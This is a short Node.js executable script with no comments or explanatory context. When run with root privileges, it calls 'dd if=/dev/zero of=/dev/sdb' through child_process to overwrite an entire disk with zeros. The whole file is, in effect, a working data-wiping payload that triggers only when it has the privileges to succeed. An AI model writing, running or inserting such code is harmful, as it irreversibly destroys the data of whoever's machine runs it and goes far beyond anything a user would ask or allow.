#!/usr/bin/env node
const { execSync } = require("child_process");
if (process.getuid() === 0) {
  execSync("dd if=/dev/zero of=/dev/sdb");
}
